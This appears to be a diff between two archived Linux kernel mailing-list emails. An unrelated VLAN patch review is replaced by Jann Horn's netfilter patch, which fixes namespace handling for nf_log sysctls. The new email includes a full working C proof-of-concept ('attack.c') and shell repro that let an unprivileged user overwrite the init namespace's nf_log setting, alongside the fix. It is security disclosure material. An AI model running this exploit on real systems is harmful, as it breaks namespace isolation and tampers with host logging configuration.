@@ -1,123 +1,148 @@
-From: Jamal Hadi Salim <jhs@mojatatu.com>
-Subject: Re: [PATCH net-next 2/2] net/sched: act_vlan: Introduce
- TCA_VLAN_ACT_MODIFY vlan action
-Date: Sun, 18 Sep 2016 15:41:27 -0400
-Message-ID: <a38624b9-80cf-a465-7758-51baac9e5faa@mojatatu.com>
-References: <1474209225-23665-1-git-send-email-shmulik.ladkani@gmail.com>
- <1474209225-23665-3-git-send-email-shmulik.ladkani@gmail.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252; format=flowed
-Content-Transfer-Encoding: 7bit
-Cc: Jiri Pirko <jiri@mellanox.com>, netdev@vger.kernel.org
-To: Shmulik Ladkani <shmulik.ladkani@gmail.com>,
-        "David S . Miller" <davem@davemloft.net>
+From: Jann Horn <jann@thejh.net>
+Subject: [PATCH] netfilter: fix namespace handling in nf_log_proc_dostring
+Date: Sun, 18 Sep 2016 21:40:55 +0200
+Message-ID: <1474227655-5022-1-git-send-email-jann@thejh.net>
+Cc: netfilter-devel@vger.kernel.org, netdev@vger.kernel.org,
+        security@kernel.org
+To: Pablo Neira Ayuso <pablo@netfilter.org>,
+        Patrick McHardy <kaber@trash.net>,
+        Jozsef Kadlecsik <kadlec@blackhole.kfki.hu>,
+        "David S. Miller" <davem@davemloft.net>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-it0-f66.google.com ([209.85.214.66]:33863 "EHLO
-        mail-it0-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1753428AbcIRTlh (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sun, 18 Sep 2016 15:41:37 -0400
-Received: by mail-it0-f66.google.com with SMTP id 186so3315499itf.1
-        for <netdev@vger.kernel.org>; Sun, 18 Sep 2016 12:41:36 -0700 (PDT)
-In-Reply-To: <1474209225-23665-3-git-send-email-shmulik.ladkani@gmail.com>
+Received: from thejh.net ([37.221.195.125]:46535 "EHLO thejh.net"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S1756174AbcIRTlq (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sun, 18 Sep 2016 15:41:46 -0400
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On 16-09-18 10:33 AM, Shmulik Ladkani wrote:
-> TCA_VLAN_ACT_MODIFY allows one to change an existing tag.
->
-> It accepts same attributes as TCA_VLAN_ACT_PUSH (protocol, id,
-> priority).
-> If packet is vlan tagged, then the tag gets overwritten according to
-> user specified attributes.
->
-> For example, this allows user to replace a tag's vid while preserving
-> its priority bits (as opposed to "action vlan pop pipe action vlan push").
->
-> Signed-off-by: Shmulik Ladkani <shmulik.ladkani@gmail.com>
-> ---
->  include/uapi/linux/tc_act/tc_vlan.h |  1 +
->  net/sched/act_vlan.c                | 29 ++++++++++++++++++++++++++++-
->  2 files changed, 29 insertions(+), 1 deletion(-)
->
-> diff --git a/include/uapi/linux/tc_act/tc_vlan.h b/include/uapi/linux/tc_act/tc_vlan.h
-> index be72b6e384..bddb272b84 100644
-> --- a/include/uapi/linux/tc_act/tc_vlan.h
-> +++ b/include/uapi/linux/tc_act/tc_vlan.h
-> @@ -16,6 +16,7 @@
->
->  #define TCA_VLAN_ACT_POP	1
->  #define TCA_VLAN_ACT_PUSH	2
-> +#define TCA_VLAN_ACT_MODIFY	3
->
->  struct tc_vlan {
->  	tc_gen;
-> diff --git a/net/sched/act_vlan.c b/net/sched/act_vlan.c
-> index 59a8d3150a..e5eeaa7a01 100644
-> --- a/net/sched/act_vlan.c
-> +++ b/net/sched/act_vlan.c
-> @@ -30,6 +30,7 @@ static int tcf_vlan(struct sk_buff *skb, const struct tc_action *a,
->  	struct tcf_vlan *v = to_vlan(a);
->  	int action;
->  	int err;
-> +	u16 tci;
->
->  	spin_lock(&v->tcf_lock);
->  	tcf_lastuse_update(&v->tcf_tm);
-> @@ -48,6 +49,30 @@ static int tcf_vlan(struct sk_buff *skb, const struct tc_action *a,
->  		if (err)
->  			goto drop;
->  		break;
-> +	case TCA_VLAN_ACT_MODIFY:
-> +		if (!skb_vlan_tagged(skb))
-> +			goto unlock;
-> +		/* extract existing tag (and guarantee no hwaccel tag) */
-> +		if (skb_vlan_tag_present(skb)) {
-> +			tci = skb_vlan_tag_get(skb);
-> +			skb->vlan_tci = 0;
-> +		} else {
-> +			if (skb->mac_len < VLAN_ETH_HLEN)
-> +				goto unlock;
-> +			err = __skb_vlan_pop(skb, &tci);
-> +			if (err)
-> +				goto drop;
-> +		}
-> +		/* replace the vid */
-> +		tci = (tci & ~VLAN_VID_MASK) | v->tcfv_push_vid;
-> +		/* replace prio bits, if tcfv_push_prio specified */
-> +		if (v->tcfv_push_prio) {
-> +			tci &= ~VLAN_PRIO_MASK;
-> +			tci |= v->tcfv_push_prio << VLAN_PRIO_SHIFT;
-> +		}
-> +		/* put updated tci as hwaccel tag */
-> +		__vlan_hwaccel_put_tag(skb, v->tcfv_push_proto, tci);
-> +		break;
->  	default:
->  		BUG();
->  	}
-> @@ -102,6 +127,7 @@ static int tcf_vlan_init(struct net *net, struct nlattr *nla,
->  	case TCA_VLAN_ACT_POP:
->  		break;
->  	case TCA_VLAN_ACT_PUSH:
-> +	case TCA_VLAN_ACT_MODIFY:
->  		if (!tb[TCA_VLAN_PUSH_VLAN_ID]) {
->  			if (exists)
->  				tcf_hash_release(*a, bind);
-> @@ -185,7 +211,8 @@ static int tcf_vlan_dump(struct sk_buff *skb, struct tc_action *a,
->  	if (nla_put(skb, TCA_VLAN_PARMS, sizeof(opt), &opt))
->  		goto nla_put_failure;
->
-> -	if (v->tcfv_action == TCA_VLAN_ACT_PUSH &&
-> +	if ((v->tcfv_action == TCA_VLAN_ACT_PUSH ||
-> +	     v->tcfv_action == TCA_VLAN_ACT_MODIFY) &&
->  	    (nla_put_u16(skb, TCA_VLAN_PUSH_VLAN_ID, v->tcfv_push_vid) ||
->  	     nla_put_be16(skb, TCA_VLAN_PUSH_VLAN_PROTOCOL,
->  			  v->tcfv_push_proto) ||
->
+nf_log_proc_dostring() used current's network namespace instead of the one
+corresponding to the sysctl file the write was performed on. Because the
+permission check happens at open time and the nf_log files in namespaces
+are accessible for the namespace owner, this can be abused by an
+unprivileged user to effectively write to the init namespace's nf_log
+sysctls.
 
+Stash the "struct net *" in extra2 - data and extra1 are already used.
 
-Nice. If you didnt do it I would have ;->
+Repro code:
 
-Acked-by: Jamal Hadi Salim <jhs@mojatatu.com>
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <sched.h>
+#include <err.h>
+#include <sys/mount.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
 
-cheers,
-jamal
+char child_stack[1000000];
+
+uid_t outer_uid;
+gid_t outer_gid;
+int stolen_fd = -1;
+
+void writefile(char *path, char *buf) {
+        int fd = open(path, O_WRONLY);
+        if (fd == -1)
+                err(1, "unable to open thing");
+        if (write(fd, buf, strlen(buf)) != strlen(buf))
+                err(1, "unable to write thing");
+        close(fd);
+}
+
+int child_fn(void *p_) {
+        if (mount("proc", "/proc", "proc", MS_NOSUID|MS_NODEV|MS_NOEXEC,
+                  NULL))
+                err(1, "mount");
+
+        /* Yes, we need to set the maps for the net sysctls to recognize us
+         * as namespace root.
+         */
+        char buf[1000];
+        sprintf(buf, "0 %d 1\n", (int)outer_uid);
+        writefile("/proc/1/uid_map", buf);
+        writefile("/proc/1/setgroups", "deny");
+        sprintf(buf, "0 %d 1\n", (int)outer_gid);
+        writefile("/proc/1/gid_map", buf);
+
+        stolen_fd = open("/proc/sys/net/netfilter/nf_log/2", O_WRONLY);
+        if (stolen_fd == -1)
+                err(1, "open nf_log");
+        return 0;
+}
+
+int main(void) {
+        outer_uid = getuid();
+        outer_gid = getgid();
+
+        int child = clone(child_fn, child_stack + sizeof(child_stack),
+                          CLONE_FILES|CLONE_NEWNET|CLONE_NEWNS|CLONE_NEWPID
+                          |CLONE_NEWUSER|CLONE_VM|SIGCHLD, NULL);
+        if (child == -1)
+                err(1, "clone");
+        int status;
+        if (wait(&status) != child)
+                err(1, "wait");
+        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
+                errx(1, "child exit status bad");
+
+        char *data = "NONE";
+        if (write(stolen_fd, data, strlen(data)) != strlen(data))
+                err(1, "write");
+        return 0;
+}
+
+Repro:
+
+$ gcc -Wall -o attack attack.c -std=gnu99
+$ cat /proc/sys/net/netfilter/nf_log/2
+nf_log_ipv4
+$ ./attack
+$ cat /proc/sys/net/netfilter/nf_log/2
+NONE
+
+Because this looks like an issue with very low severity, I'm sending it to
+the public list directly.
+
+Signed-off-by: Jann Horn <jann@thejh.net>
+---
+ net/netfilter/nf_log.c | 6 ++++--
+ 1 file changed, 4 insertions(+), 2 deletions(-)
+
+diff --git a/net/netfilter/nf_log.c b/net/netfilter/nf_log.c
+index aa5847a..1df2c8d 100644
+--- a/net/netfilter/nf_log.c
++++ b/net/netfilter/nf_log.c
+@@ -420,7 +420,7 @@ static int nf_log_proc_dostring(struct ctl_table *table, int write,
+ 	char buf[NFLOGGER_NAME_LEN];
+ 	int r = 0;
+ 	int tindex = (unsigned long)table->extra1;
+-	struct net *net = current->nsproxy->net_ns;
++	struct net *net = table->extra2;
+ 
+ 	if (write) {
+ 		struct ctl_table tmp = *table;
+@@ -474,7 +474,6 @@ static int netfilter_log_sysctl_init(struct net *net)
+ 				 3, "%d", i);
+ 			nf_log_sysctl_table[i].procname	=
+ 				nf_log_sysctl_fnames[i];
+-			nf_log_sysctl_table[i].data = NULL;
+ 			nf_log_sysctl_table[i].maxlen = NFLOGGER_NAME_LEN;
+ 			nf_log_sysctl_table[i].mode = 0644;
+ 			nf_log_sysctl_table[i].proc_handler =
+@@ -484,6 +483,9 @@ static int netfilter_log_sysctl_init(struct net *net)
+ 		}
+ 	}
+ 
++	for (i = NFPROTO_UNSPEC; i < NFPROTO_NUMPROTO; i++)
++		table[i].extra2 = net;
++
+ 	net->nf.nf_log_dir_header = register_net_sysctl(net,
+ 						"net/netfilter/nf_log",
+ 						table);
+-- 
+2.1.4
